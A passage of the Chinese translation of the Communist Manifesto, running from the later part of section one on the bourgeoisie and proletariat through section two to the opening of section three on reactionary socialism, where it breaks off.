资产阶级在它已经取得了统治的地方把一切封建的、宗法的和田园诗般的关系都破坏了。它无情地斩断了把人们束缚于天然尊长的形形色色的封建羁绊，它使人和人之间除了赤裸裸的利害关系，除了冷酷无情的“现金交易”，就再也没有任何别的联系了。它把宗教虔诚、骑士热忱、小市民伤感这些情感的神圣发作，淹没在利己主义打算的冰水之中。它把人的尊严变成了交换价值，用一种没有良心的贸易自由代替了无数特许的和自力挣得的自由。总而言之，它用公开的、无耻的、直接的、露骨的剥削代替了由宗教幻想和政治幻想掩盖着的剥削。\n\n　　资产阶级抹去了一切向来受人尊崇和令人敬畏的职业的神圣光环。它把医生、律师、教士、诗人和学者变成了它出钱招雇的雇佣劳动者。\n\n　　资产阶级撕下了罩在家庭关系上的温情脉脉的面纱，把这种关系变成了纯粹的金钱关系。\n\n　　资产阶级揭示了，在中世纪深受反动派称许的那种人力的野蛮使用，是以极端怠惰作为相应补充的。它第一个证明了，人的活动能够取得什么样的成就。它创造了完全不同于埃及金字塔、罗马水道和哥特式教堂的奇迹；它完成了完全不同于民族大迁徙和十字军东征的远征。\n\n　　资产阶级除非对生产工具，从而对生产关系，从而对全部社会关系不断地进行革命，否则就不能生存下去。反之，原封不动地保持旧的生产方式，却是过去的一切工业阶级生存的首要条件。生产的不断变革，一切社会状况不停的动荡，永远的不安定和变动，这就是资产阶级时代不同于过去一切时代的地方。一切固定的僵化的关系以及与之相适应的素被尊崇的观念和见解都被消除了，一切新形成的关系等不到固定下来就陈旧了。一切等级的和固定的东西都烟消云散了，一切神圣的东西都被亵渎了。人们终于不得不用冷静的眼光来看他们的生活地位、他们的相互关系。\n\n　　不断扩大产品销路的需要，驱使资产阶级奔走于全球各地。它必须到处落户，到处开发，到处建立联系。\n\n　　资产阶级，由于开拓了世界市场，使一切国家的生产和消费都成为世界性的了。使反动派大为惋惜的是，资产阶级挖掉了工业脚下的民族基础。古老的民族工业被消灭了，并且每天都还在被消灭。它们被新的工业排挤掉了，新的工业的建立已经成为一切文明民族的生命攸关的问题；这些工业所加工的，已经不是本地的原料，而是来自极其遥远的地区的原料；它们的产品不仅供本国消费，而且同时供世界各地消费。旧的、靠国产品来满足的需要，被新的、要靠极其遥远的国家和地带的产品来满足的需要所代替了。过去那种地方的和民族的自给自足和闭关自守状态，被各民族的各方面的互相往来和各方面的互相依赖所代替了。物质的生产是如此，精神的生产也是如此。各民族的精神产品成了公共的财产。民族的片面性和局限性日益成为不可能，于是由许多种民族的和地方的文学形成了一种世界的文学。\n\n　　资产阶级，由于一切生产工具的迅速改进，由于交通的极其便利，把一切民族甚至最野蛮的民族都卷到文明中来了。它的商品的低廉价格，是它用来摧毁一切万里长城、征服野蛮人最顽强的仇外心理的重炮。它迫使一切民族——如果它们不想灭亡的话——采用资产阶级的生产方式；它迫使它们在自己那里推行所谓文明，即变成资产者。一句话，它按照自己的面貌为自己创造出一个世界。\n\n　　资产阶级使农村屈服于城市的统治。它创立了巨大的城市，使城市人口比农村人口大大增加起来，因而使很大一部分居民脱离了农村生活的愚昧状态。正象它使农村从属于城市一样，它使未开化和半开化的国家从属于文明的国家，使农民的民族从属于资产阶级的民族，使东方从属于西方。\n\n　　资产阶级日甚一日地消灭生产资料、财产和人口的分散状态。它使人口密集起来，使生产资料集中起来，使财产聚集在少数人的手里。由此必然产生的结果就是政治的集中。各自独立的、几乎只有同盟关系的、各有不同利益、不同法律、不同政府、不同关税的各个地区，现在已经结合为一个拥有统一的政府、统一的法律、统一的民族阶级利益和统一的关税的统一的民族。\n\n　　资产阶级在它的不到一百年的阶级统治中所创造的生产力，比过去一切世代创造的全部生产力还要多，还要大。自然力的征服，机器的采用，化学在工业和农业中的应用，轮船的行驶，铁路的通行，电报的使用，整个整个大陆的开垦，河川的通航，仿佛用法术从地下呼唤出来的大量人口，——过去哪一个世纪料想到在社会劳动里蕴藏有这样的生产力呢？\n\n　　由此可见，资产阶级赖以形成的生产资料和交换手段，是在封建社会里造成的。在这些生产资料和交换手段发展的一定阶段上，封建社会的生产和交换在其中进行的关系，封建的农业和工场手工业组织，一句话，封建的所有制关系，就不再适应已经发展的生产力了。这种关系已经在阻碍生产而不是促进生产了。它变成了束缚生产的桎梏。它必须被炸毁，而且已经被炸毁了。\n\n　　起而代之的是自由竞争以及与自由竞争相适应的社会制度和政治制度、资产阶级的经济统治和政治统治。\n\n　　现在，我们眼前又进行着类似的运动。资产阶级的生产关系和交换关系，资产阶级的所有制关系，这个曾经仿佛用法术创造了如此庞大的生产资料和交换手段的现代资产阶级社会，现在像一个魔法师一样不能再支配自己用法术呼唤出来的魔鬼了。几十年来的工业和商业的历史，只不过是现代生产力反抗现代生产关系、反抗作为资产阶级及其统治的存在条件的所有制关系的历史。只要指出在周期性的重复中越来越危及整个资产阶级社会生存的商业危机就够了。在商业危机期间，总是不仅有很大一部分制成的产品被毁灭掉，而且有很大一部分已经造成的生产力被毁灭掉。在危机期间，发生一种在过去一切时代看来都好象是荒唐现象的社会瘟疫，即生产过剩的瘟疫。社会突然发现自己回到了一时的野蛮状态；仿佛是一次饥荒、一场普遍的毁灭性战争，使社会失去了全部生活资料；仿佛是工业和商业全被毁灭了，——这是什么缘故呢？因为社会上文明过度，生活资料太多，工业和商业太发达。社会所拥有的生产力已经不能再促进资产阶级文明和资产阶级所有制关系的发展；相反，生产力已经强大到这种关系所不能适应的地步，它已经受到这种关系的阻碍；而它一着手克服这种障碍，就使整个资产阶级社会陷入混乱，就使资产阶级所有制的存在受到威胁。资产阶级的关系已经太狭窄了，再容纳不了它本身所造成的财富了。——资产阶级用什么办法来克服这种危机呢？一方面不得不消灭大量生产力，另一方面夺取新的市场，更加彻底地利用旧的市场。这究竟是怎样的一种办法呢？这不过是资产阶级准备更全面更猛烈的危机的办法，不过是使防止危机的手段越来越少的办法。\n\n　　资产阶级用来推翻封建制度的武器，现在却对准资产阶级自己了。\n\n　　但是，资产阶级不仅锻造了置自身于死地的武器；它还产生了将要运用这种武器的人——现代的工人，即无产者。\n\n　　随着资产阶级即资本的发展，无产阶级即现代工人阶级也在同一程度上得到发展；现代的工人只有当他们找到工作的时候才能生存，而且只有当他们的劳动增殖资本的时候才能找到工作。这些不得不把自己零星出卖的工人，像其它任何货物一样，也是一种商品，所以他们同样地受到竞争的一切变化、市场的一切波动的影响。\n\n　　由于机器的推广和分工，无产者的劳动已经失去了任何独立的性质，因而对工人也失去了任何吸引力。工人变成了机器的单纯的附属品，要求他做的只是极其简单、极其单调和极容易学会的操作。因此，花在工人身上的费用，几乎只限于维持工人生活和延续工人后代所必需的生活资料。但是，商品的价格，从而劳动的价格，是同它的生产费用相等的。因此，劳动越使人感到厌恶，工资也就越减少。不仅如此，机器越推广，分工越细致，劳动量也就越增加，这或者是由于工作时间的延长，或者是由于在一定时间内所要求的劳动的增加，机器运转的加速，等等。\n\n　　现代工业已经把家长式的师傅的小作坊变成了工业资本家的大工厂。挤在工厂里的工人群众就象士兵一样被组织起来。他们是产业军的普通士兵，受着各级军士和军官的层层监视。他们不仅是资产阶级的、资产阶级国家的奴隶，并且每日每时都受机器、受监工、首先是受各个经营工厂的资产者本人的奴役。这种专制制度越是公开地把营利宣布为自己的最终目的，它就越是可鄙、可恨和可恶。\n\n　　手的操作所要求的技巧和气力越少，换句话说，现代工业越发达，男工也就越受到女工和童工的排挤。对工人阶级来说，性别和年龄的差别再没有什么社会意义了。他们都只是劳动工具，不过因为年龄和性别的不同而需要不同的费用罢了。\n\n　　当厂主对工人的剥削告一段落，工人领到了用现钱支付的工资的时候，马上就有资产阶级中的另一部分人——房东、小店主、当铺老板等等向他们扑来。\n\n　　以前的中间等级的下层，即小工业家、小商人和小食利者，手工业者和农民——所有这些阶级都降落到无产阶级的队伍里来了，有的是因为他们的小资本不足以经营大工业，经不起较大资本家的竞争；有的是因为他们的手艺已经被新的生产方法弄得不值钱了。无产阶级的队伍就是这样从居民的所有阶级中得到补充的。\n\n　　无产阶级经历了各个不同的发展阶段。它反对资产阶级的斗争是和它的存在同时开始的。\n\n　　最初是单个的工人，然后是某一工厂的工人，然后是某一地方的某一劳动部门的工人，同直接剥削他们的单个资产者作斗争。他们不仅仅攻击资产阶级的生产关系，而且攻击生产工具本身；他们毁坏那些来竞争的外国商品，捣毁机器，烧毁工厂，力图恢复已经失去的中世纪工人的地位。\n\n　　在这个阶段上，工人们还是分散在全国各地并为竞争所分裂的群众。工人的大规模集结，还不是他们自己联合的结果，而是资产阶级联合的结果，当时资产阶级为了达到自己的政治目的必须而且暂时还能够把整个无产阶级发动起来。因此，在这个阶段上，无产者不是同自己的敌人作斗争，而是同自己的敌人的敌人作斗争，即同专制君主制的残余、地主、非工业资产阶级和小资产者作斗争。因此，整个历史运动都集中在资产阶级手里；在这种条件下取得的每一个胜利都是资产阶级的胜利。\n\n　　但是，随着工业的发展，无产阶级不仅人数增加了，而且它结合成更大的集体，它的力量日益增长，它越来越感觉到自己的力量。机器使劳动的差别越来越小，使工资几乎到处都降到同样低的水平，因而无产阶级内部的利益和生活状况也越来越趋于一致。资产者彼此间日益加剧的竞争以及由此引起的商业危机，使工人的工资越来越不稳定；机器的日益迅速的和继续不断的改良，使工人的整个生活地位越来越没有保障；单个工人和单个资产者之间的冲突越来越具有两个阶级的冲突的性质。工人开始成立反对资产者的同盟；他们联合起来保卫自己的工资。他们甚至建立了经常性的团体，以便为可能发生的反抗准备食品。有些地方，斗争爆发为起义。\n\n　　工人有时也得到胜利，但这种胜利只是暂时的。他们斗争的真正成果并不是直接取得的成功，而是工人的越来越扩大的联合。这种联合由于大工业所造成的日益发达的交通工具而得到发展，这种交通工具把各地的工人彼此联系起来。只要有了这种联系，就能把许多性质相同的地方性的斗争汇合成全国性的斗争，汇合成阶级斗争。而一切阶级斗争都是政治斗争。中世纪的市民靠乡间小道需要几百年才能达到的联合，现代的无产者利用铁路只要几年就可以达到了。\n\n　　无产者组织成为阶级，从而组织成为政党这件事，不断地由于工人的自相竞争而受到破坏。但是，这种组织总是重新产生，并且一次比一次更强大，更坚固，更有力。它利用资产阶级内部的分裂，迫使他们用法律形式承认工人的个别利益。英国的十小时工作日法案就是一个例子。\n\n　　旧社会内部的所有冲突在许多方面都促进了无产阶级的发展。资产阶级处于不断的斗争中：最初反对贵族：后来反对同工业进步有利害冲突的那部分资产阶级；经常反对一切外国的资产阶级。在这一切斗争中，资产阶级都不得不向无产阶级呼吁，要求无产阶级援助，这样就把无产阶级卷进了政治运动。于是，资产阶级自己就把自己的教育因素即反对自身的武器给予了无产阶级。\n\n　　其次，我们已经看到，工业的进步把统治阶级的整批成员拋到无产阶级队伍里去，或者至少也使他们的生活条件受到威胁。他们也给无产阶级带来了大量的教育因素。\n\n　　最后，在阶级斗争接近决战的时期，统治阶级内部的、整个旧社会内部的瓦解过程，就达到非常强烈、非常尖锐的程度，甚至使得统治阶级中的一小部分人脱离统治阶级而归附于革命的阶级，即掌握着未来的阶级。所以，正像过去贵族中有一部分人转到资产阶级方面一样，现在资产阶级中也有一部分人，特别是已经提高到从理论上认识整个历史运动这一水平的一部分资产阶级思想家，转到无产阶级方面来了。\n\n　　在当前同资产阶级对立的一切阶级中，只有无产阶级是真正革命的阶级。其余的阶级都随着大工业的发展而日趋没落和灭亡，无产阶级却是大工业本身的产物。\n\n　　中间等级，即小工业家、小商人、手工业者、农民，他们同资产阶级作斗争，都是为了维护他们这种中间等级的生存，以免于灭亡。所以，他们不是革命的，而是保守的。不仅如此，他们甚至是反动的，因为他们力图使历史的车轮倒转。如果说他们是革命的，那是鉴于他们行将转入无产阶级的队伍，这样，他们就不是维护他们目前的利益，而是维护他们将来的利益，他们就离开自己原来的立场，而站到无产阶级的立场上来。\n\n　　流氓无产阶级是旧社会最下层中消极的腐化的部分，他们在一些地方也被无产阶级革命卷到运动里来，但是，由于他们的整个生活状况，他们更甘心于被人收买，去干反动的勾当。\n\n　　在无产阶级的生活条件中，旧社会的生活条件已经被消灭了。无产者是没有财产的；他们和妻子儿女的关系同资产阶级的家庭关系再没有任何共同之处了；现代的工业劳动，现代的资本压迫，无论在英国或法国，无论在美国或德国，都是一样的，都使无产者失去了任何民族性。法律、道德、宗教，在他们看来全都是资产阶级偏见，隐藏在这些偏见后面的全都是资产阶级利益。\n\n　　过去一切阶级在争得统治之后，总是使整个社会服从于它们发财致富的条件，企图以此来巩固它们已经获得的生活地位。无产者只有废除自己的现存的占有方式，从而废除全部现存的占有方式，才能取得社会生产力。无产者没有什么自己的东西必须加以保护，他们必须摧毁至今保护和保障私有财产的一切。\n\n　　过去的一切运动都是少数人的或者为少数人谋利益的运动。无产阶级的运动是绝大多数人的、为绝大多数人谋利益的独立的运动。无产阶级，现今社会的最下层，如果不炸毁构成官方社会的整个上层，就不能抬起头来，挺起胸来。\n\n　　如果不就内容而就形式来说，无产阶级反对资产阶级的斗争首先是一国范围内的斗争。每一个国家的无产阶级当然首先应该打倒本国的资产阶级。\n\n　　在叙述无产阶级发展的最一般的阶段的时候，我们循序探讨了现存社会内部或多或少隐蔽着的国内战争，直到这个战争爆发为公开的革命，无产阶级用暴力推翻资产阶级而建立自己的统治。\n\n　　我们已经看到，至今的一切社会都是建立在压迫阶级和被压迫阶级的对立之上的。但是，为了有可能压迫一个阶级，就必须保证这个阶级至少有能够勉强维持它的奴隶般的生存的条件。农奴曾经在农奴制度下挣扎到公社社员的地位，小资产者曾经在封建专制制度的束缚下挣扎到资产者的地位。现代的工人却相反，他们并不是随着工业的进步而上升，而是越来越降到本阶级的生存条件以下。工人变成赤贫者，贫困比人口和财富增长得还要快。由此可以明显地看出，资产阶级再不能做社会的统治阶级了，再不能把自己阶级的生存条件当做支配一切的规律强加于社会了。资产阶级不能统治下去了，因为它甚至不能保证自己的奴隶维持奴隶的生活，因为它不得不让自己的奴隶落到不能养活它反而要它来养活的地步。社会再不能在它统治下生活下去了，就是说，它的存在不再同社会兼容了。\n\n　　资产阶级生存和统治的根本条件，是财富在私人手里的积累，是资本的形成和增殖；资本的条件是雇佣劳动。雇佣劳动完全是建立在工人的自相竞争之上的。资产阶级无意中造成而又无力抵抗的工业进步，使工人通过结社而达到的革命联合代替了他们由于竞争而造成的分散状态。于是，随着大工业的发展，资产阶级赖以生产和占有产品的基础本身也就从它的脚下被挖掉了。它首先生产的是它自身的掘墓人。资产阶级的灭亡和无产阶级的胜利是同样不可避免的。\n\n# 二、无产者和共产党人\n\n\n　　共产党人同全体无产者的关系是怎样的呢？\n\n　　共产党人不是同其它工人政党相对立的特殊政党。\n\n　　他们没有任何同整个无产阶级的利益不同的利益。\n\n　　他们不提出任何特殊的原则，用以塑造无产阶级的运动。\n\n　　共产党人同其它无产阶级政党不同的地方只是：一方面，在各国无产者的斗争中，共产党人强调和坚持整个无产阶级共同的不分民族的利益；另一方面，在无产阶级和资产阶级的斗争所经历的各个发展阶段上，共产党人始终代表整个运动的利益。\n\n　　因此，在实践方面，共产党人是各国工人政党中最坚决的、始终起推动作用的部分；在理论方面，他们胜过其余的无产阶级群众的地方在于他们了解无产阶级运动的条件、进程和一般结果。\n\n　　共产党人的最近目的是和其它一切无产阶级政党的最近目的一样的：使无产阶级形成为阶级，推翻资产阶级的统治，由无产阶级夺取政权。\n\n　　共产党人的理论原理，决不是以这个或那个世界改革家所发明或发现的思想、原则为根据的。\n\n　　这些原理不过是现在的阶级斗争、我们眼前的历史运动的真实关系的一般表述。废除先前存在的所有制关系，并不是共产主义所独具的特征。\n\n　　一切所有制关系都经历了经常的历史更替、经常的历史变更。\n\n　　例如，法国革命废除了封建的所有制，代之以资产阶级的所有制。\n\n　　共产主义的特征并不是要废除一般的所有制，而是要废除资产阶级的所有制。\n\n　　但是，现代的资产阶级私有制是建立在阶级对立上面、建立在一些人对另一些人的剥削上面的产品生产和占有的最后而又最完备的表现。\n\n　　从这个意义上说，共产党人可以把自己的理论概括为一句话：消灭私有制。\n\n　　有人责备我们共产党人，说我们要消灭个人挣得的、自己劳动得来的财产，要消灭构成个人的一切自由、活动和独立的基础的财产。\n\n　　好一个劳动得来的、自己挣得的、自己赚来的财产！你们说的是资产阶级所有制以前的那种小资产阶级的、小农的财产吗？那种财产用不着我们去消灭，工业的发展已经把它消灭了，而且每天都在消灭它。\n\n　　或者，你们说的是现代的资产阶级的私有财产吧？\n\n　　但是，难道雇佣劳动，无产者的劳动，会给无产者创造出财产来吗？没有的事。这种劳动所创造的是资本，即剥削雇佣劳动的财产，只有在不断产生出新的雇佣劳动来重新加以剥削的条件下才能增加起来的财产。现今的这种财产是在资本和雇佣劳动的对立中运动的。让我们来看看这种对立的两个方面吧。\n\n　　做一个资本家，这就是说，他在生产中不仅占有一种纯粹个人的地位，而且占有一种社会的地位。资本是集体的产物，它只有通过社会许多成员的共同活动，而且归根到底只有通过社会全体成员的共同活动，才能运动起来。\n\n　　因此，资本不是一种个人力量，而是一种社会力量。\n\n　　因此，把资本变为公共的、属于社会全体成员的财产，这并不是把个人财产变为社会财产。这时所改变的只是财产的社会性质。它将失掉它的阶级性质。\n\n　　现在，我们来看看雇佣劳动。\n\n　　雇佣劳动的平均价格是最低限度的工资，即工人为维持其工人的生活所必需的生活资料的数额。因此，雇佣工人靠自己的劳动所占有的东西，只够勉强维持他的生命的再生产。我们决不打算消灭这种供直接生命再生产用的劳动产品的个人占有，这种占有并不会留下任何剩余的东西使人们有可能支配别人的劳动。我们要消灭的只是这种占有的可怜的性质，在这种占有下，工人仅仅为增殖资本而活着，只有在统治阶级的利益需要他活着的时候才能活着。\n\n　　在资产阶级社会里，活的劳动只是增殖已经积累起来的劳动的一种手段。在共产主义社会里，已经积累起来的劳动只是扩大、丰富和提高工人的生活的一种手段。\n\n　　因此，在资产阶级社会里是过去支配现在，在共产主义社会里是现在支配过去。在资产阶级社会里，资本具有独立性和个性，而活动着的个人却没有独立性和个性。\n\n　　而资产阶级却把消灭这种关系说成是消灭个性和自由！说对了。的确，正是要消灭资产者的个性、独立性和自由。\n\n　　在现今的资产阶级生产关系的范围内，所谓自由就是自由贸易，自由买卖。\n\n　　但是，买卖一消失，自由买卖也就会消失。关于自由买卖的言论，也象我们的资产阶级的其它一切关于自由的大话一样，仅仅对于不自由的买卖来说，对于中世纪被奴役的市民来说，才是有意义的，而对于共产主义要消灭买卖、消灭资产阶级生产关系和资产阶级本身这一点来说，却是毫无意义的。\n\n　　我们要消灭私有制，你们就惊慌起来。但是，在你们的现存社会里，私有财产对十分之九的成员来说已经被消灭了；这种私有制之所以存在，正是因为私有财产对十分之九的成员来说已经不存在。可见，你们责备我们，是说我们要消灭那种以社会上的绝大多数人没有财产为必要条件的所有制。\n\n　　总而言之，你们责备我们，是说我们要消灭你们的那种所有制。的确，我们是要这样做的。\n\n　　从劳动不再能变为资本、货币、地租，一句话，不再能变为可以垄断的社会力量的时候起，就是说，从个人财产不再能变为资产阶级财产的时候起，你们说，个性就被消灭了。\n\n　　由此可见，你们是承认，你们所理解的个性，不外是资产者、资产阶级私有者。这样的个性确实应当被消灭。\n\n　　共产主义并不剥夺任何人占有社会产品的权力，它只剥夺利用这种占有去奴役他人劳动的权力。\n\n　　有人反驳说，私有制一消灭，一切活动就会停止，懒惰之风就会兴起。\n\n　　这样说来，资产阶级社会早就应该因懒惰而灭亡了，因为在这个社会里是劳者不获，获者不劳的。所有这些顾虑，都可以归结为这样一个同义反复：一旦没有资本，也就不再有雇佣劳动了。\n\n　　所有这些对共产主义的物质产品的占有方式和生产方式的责备， 也被扩及到精神产品的占有和生产方面。正如阶级的所有制的终止在资产者看来是生产本身的终止一样，阶级的教育的终止在他们看来就等于一切教育的终止。\n\n　　资产者唯恐失去的那种教育，对绝大多数人来说是把人训练成机器。\n\n　　但是，你们既然用你们资产阶级关于自由、教育、法等等的观念来衡量废除资产阶级所有制的主张，那就请你们不要同我们争论了。你们的观念本身是资产阶级的生产关系和所有制关系的产物，正象你们的法不过是被奉为法律的你们这个阶级的意志一样，而这种意志的内容是由你们这个阶级的物质生活条件来决定的。\n\n　　你们的利己观念使你们把自己的生产关系和所有制关系从历史的、在生产过程中是暂时的关系变成永恒的自然规律和理性规律，这种利己观念是你们和一切灭亡了的统治阶级所共有的。谈到古代所有制的时候你们所能理解的，谈到封建所有制的时候你们所能理解的，一谈到资产阶级所有制你们就再也不能理解了。\n\n　　消灭家庭！连极端的激进派也对共产党人的这种可耻的意图表示愤慨。\n\n　　现代的、资产阶级的家庭是建立在什么基础上的呢？是建立在资本上面，建立在私人发财上面的。这种家庭只是在资产阶级那里才以充分发展的形式存在着，而无产者的被迫独居和公开的卖淫则是它的补充。\n\n　　资产者的家庭自然会随着它的这种补充的消失而消失，两者都要随着资本的消失而消失。\n\n　　你们是责备我们要消灭父母对子女的剥削吗？我们承认这种罪状。\n\n　　但是，你们说，我们用社会教育代替家庭教育，就是要消灭人们最亲密的关系。\n\n　　而你们的教育不也是由社会决定的吗？不也是由你们进行教育的那种社会关系决定的吗？不也是由社会通过学校等等进行的直接的或间接的干涉决定的吗？共产党人并没有发明社会对教育的影响；他们仅仅是要改变这种影响的性质，要使教育摆脱统治阶级的影响。\n\n　　无产者的一切家庭联系越是由于大工业的发展而被破坏，他们的子女越是由于这种发展而被变成单纯的商品和劳动工具，资产阶级关于家庭和教育、关于父母和子女的亲密关系的空话就越是令人作呕。\n\n　　但是，你们共产党人是要实行公妻制的啊，——整个资产阶级异口同声地向我们这样叫喊。\n\n　　资产者是把自己的妻子看作单纯的生产工具的。他们听说生产工具将要公共使用，自然就不能不想到妇女也会遭到同样的命运。\n\n　　他们想也没有想到，问题正在于使妇女不再处于单纯生产工具的地位。\n\n　　其实，我们的资产者装得道貌岸然，对所谓的共产党人的正式公妻制表示惊讶，那是再可笑不过了。公妻制无需共产党人来实行，它差不多是一向就有的。\n\n　　我们的资产者不以他们的无产者的妻子和女儿受他们支配为满足，正式的卖淫更不必说了，他们还以互相诱奸妻子为最大的享乐。\n\n　　资产阶级的婚姻实际上是公妻制。人们至多只能责备共产党人，说他们想用正式的、公开的公妻制来代替伪善地掩蔽着的公妻制。其实，不言而喻，随着现在的生产关系的消灭，从这种关系中产生的公妻制，即正式的和非正式的卖淫，也就消失了。\n\n　　还有人责备共产党人，说他们要取消祖国，取消民族。\n\n　　工人没有祖国。决不能剥夺他们所没有的东西。因为无产阶级首先必须取得政治统治，上升为民族的阶级，把自身组织成为民族，所以它本身还是民族的，虽然完全不是资产阶级所理解的那种意思。\n\n　　随着资产阶级的发展，随着贸易自由的实现和世界市场的建立，随着工业生产以及与之相适应的生活条件的趋于一致，各国人民之间的民族隔绝和对立日益消失。\n\n　　无产阶级的统治将使它们更快地消失。联合的行动，至少是各文明国家的联合的行动，是无产阶级获得解放的首要条件之一。\n\n　　人对人的剥削一消灭，民族对民族的剥削就会随之消灭。\n\n　　民族内部的阶级对立一消失，民族之间的敌对关系就会随之消失。\n\n　　从宗教的、哲学的和一般意识形态的观点对共产主义提出的种种责难，都不值得详细讨论了。\n\n　　人们的观念、观点和概念，一句话，人们的意识，随着人们的生活条件、人们的社会关系、人们的社会存在的改变而改变，这难道需要经过深思才能了解吗？\n\n　　思想的历史除了证明精神生产随着物质生产的改造而改造，还证明了什么呢？任何一个时代的统治思想始终都不过是统治阶级的思想。\n\n　　当人们谈到使整个社会革命化的思想时，他们只是表明了一个事实：在旧社会内部已经形成了新社会的因素，旧思想的瓦解是同旧生活条件的瓦解步调一致的。\n\n　　当古代世界走向灭亡的时候，古代的各种宗教就被基督教战胜了。当基督教思想在18世纪被启蒙思想击败的时候，封建社会正在同当时革命的资产阶级进行殊死的斗争。信仰自由和宗教自由的思想，不过表明自由竞争在信仰的领域里占统治地位罢了。\n\n　　“但是”，有人会说，“宗教的、道德的、哲学的、政治的、法的观念等等在历史发展的进程中固然是不断改变的，而宗教、道德、哲学、政治和法在这种变化中却始终保存着。\n\n　　此外，还存在着一切社会状态所共有的永恒的真理，如自由、正义等等。但是共产主义要废除永恒真理，它要废除宗教、道德，而不是加以革新，所以共产主义是同至今的全部历史发展进程相矛盾的。”\n\n　　这种责难归结为什么呢？至今的一切社会的历史都是在阶级对立中运动的，而这种对立在各个不同的时代具有不同的形式。\n\n　　但是，不管阶级对立具有什么样的形式，社会上一部分人对另一部分人的剥削却是过去各个世纪所共有的事实。因此，毫不奇怪，各个世纪的社会意识，尽管形形色色、千差万别，总是在某些共同的形式中运动的，这些形式，这些意识形式，只有当阶级对立完全消失的时候才会完全消失。\n\n　　共产主义革命就是同传统的所有制关系实行最彻底的决裂；毫不奇怪，它在自己的发展进程中要同传统的观念实行最彻底的决裂。\n\n　　不过，我们还是把资产阶级对共产主义的种种责难撇开吧。\n\n　　前面我们已经看到，工人革命的第一步就是使无产阶级上升为统治阶级，争得民主。\n\n　　无产阶级将利用自己的政治统治，一步一步地夺取资产阶级的全部资本，把一切生产工具集中在国家即组织成为统治阶级的无产阶级手里，并且尽可能快地增加生产力的总量。\n\n　　要做到这一点，当然首先必须对所有权和资产阶级生产关系实行强制性的干涉，也就是采取这样一些措施，这些措施在经济上似乎是不够充分的和没有力量的，但是在运动进程中它们会越出本身，而且作为变革全部生产方式的手段是必不可少的。\n\n　　这些措施在不同的国家里当然会是不同的。\n\n　　但是，最先进的国家几乎都可以采取下面的措施：\n\n　　1．剥夺地产，把地租用于国家支出。\n\n　　2．征收高额累进税。\n\n　　3．废除继承权。\n\n　　4．没收一切流亡分子和叛乱分子的财产。\n\n　　5．通过拥有国家资本和独享垄断权的国家银行，把信贷集中在国家手里。\n\n　　6．把全部运输业集中在国家手里。\n\n　　7．按照总的计划增加国营工厂和生产工具，开垦荒地和改良土壤。\n\n　　8．实行普遍劳动义务制，成立产业军，特别是在农业方面。\n\n　　9．把农业和工业结合起来，促使城乡对立逐步消灭。\n\n　　10．对所有儿童实行公共的和免费的教育。取消现在这种形式的儿童的工厂劳动。把教育同物质生产结合起来，等等。\n\n　　当阶级差别在发展进程中已经消失而全部生产集中在联合起来的个人的手里的时候，公共权力就失去政治性质。原来意义上的政治权力，是一个阶级用以压迫另一个阶级的有组织的暴力。如果说无产阶级在反对资产阶级的斗争中一定要联合为阶级，如果说它通过革命使自己成为统治阶级，并以统治阶级的资格用暴力消灭旧的生产关系，那么它在消灭这种生产关系的同时，也就消灭了阶级对立和阶级本身的存在条件，从而消灭了它自己这个阶级的统治。\n\n　　代替那存在着阶级和阶级对立的资产阶级旧社会的，将是这样一个联合体，在那里，每个人的自由发展是一切人的自由发展的条件。\n\n# 三、社会主义的和共产主义的文献\n\n\n1．反动的社会主义\n\n\n(甲)封建的社会主义\n\n　　法国和英国的贵族，按照他们的历史地位所负的使命，就是写一些抨击现代资产阶级社会的作品。在法国的1830年七月革命和英国的改革运动中，他们再一次被可恨的暴发户打败了。从此就再谈不上严重的政治斗争了。他们还能进行的只是文字斗争。但是，即使在文字方面也不可能重弹复辟时期的老调了。为了激起同情，贵族们不得不装模做样，似乎他们已经不关心自身的利益，只是为了被剥削的工人阶级的利益才去写对资产阶级的控诉书。他们用来泄愤的手段是：唱唱诅咒他们的新统治者的歌，并向他叽叽咕咕地说一些或多或少凶险的预言。\n　　这样就产生了封建的社会主义，半是挽歌，半是谤文；半是过去的回音，半是未来的恫吓；它有时也能用辛辣、俏皮而尖刻的评论刺中资产阶级的心，但是它由于完全不能理解现代历史的进程而总是令人感到可笑。\n　　为了拉拢人民，贵族们把无产阶级的乞食袋当做旗帜来挥舞。但是，每当人民跟着他们走的时候，都发现他们的臀部带有旧的封建纹章，于是就哈哈大笑，一哄而散。\n　　一部分法国正统派和“青年英国”，都演过这出戏。\n　　封建主说，他们的剥削方式和资产阶级的剥削不同，那他们只是忘记了，他们是在完全不同的、目前已经过时的情况和条件下进行剥削的。他们说，在他们的统治下并没有出现过现代的无产阶级，那他们只是忘记了，现代的资产阶级正是他们的社会制度的必然产物。\n　　不过，他们毫不掩饰自己的批评的反动性质，他们控告资产阶级的主要罪状正是在于：在资产阶级的统治下有一个将把整个旧社会制度炸毁的阶级发展起来。\n　　他们责备资产阶级，与其说是因为它产生了无产阶级，不如说是因为它产生了革命的无产阶级。\n　　因此，在政治实践中，他们参与对工人阶级采取的一切暴力措施，在日常生活中，他们违背自己的那一套冠冕堂皇的言词，屈尊拾取金苹果，不顾信义、仁爱和名誉去做羊毛、甜菜和烧酒的买卖。\n　　正如僧侣总是同封建主携手同行一样，僧侣的社会主义也总是同封建的社会主义携手同行的。\n　　要给基督教禁欲主义涂上一层社会主义的色彩，是再容易不过了。基督教不是也激烈反对私有制，反对婚姻，反对国家吗？它不是提倡用行善和求乞、独身和禁欲、修道和礼拜来代替这一切吗？基督教的社会主义，只不过是僧侣用来使贵族的怨愤神圣化的圣水罢了。\n\n(乙)小资产阶级的社会主义\n\n　　封建贵族并不是被资产阶级所推翻的、其生活条件在现代资产阶级社会里日益恶化和消失的唯一阶级。中世纪的城关市民等级和小农等级是现代资产阶级的前身。在工商业不很发达的国家里，这个阶级还在新兴的资产阶级身旁勉强生存着。\n　　在现代文明已经发展的国家里,形成了一个新的小资产阶级，它摇摆于无产阶级和资产阶级之间，并且作为资产阶级社会的补充部分不断地重新组成。但是，这一阶级的成员经常被竞争拋到无产阶级队伍里去，而且，随着大工业的发展，他们甚至觉察到，他们很快就会完全失去他们作为现代社会中一个独立部分的地位，在商业、工业和农业中很快就会被监工和雇员所代替。\n　　在农民阶级远远超过人口半数的国家，例如在法国，那些站在无产阶级方面反对资产阶级的著作家，自然是用小资产阶级和小农的尺度去批判资产阶级制度的，是从小资产阶级的立场出发替工人说话的。这样就形成了小资产阶级的社会主义。西斯蒙第不仅对法国而且对英国来说都是这类著作家的首领。\n　　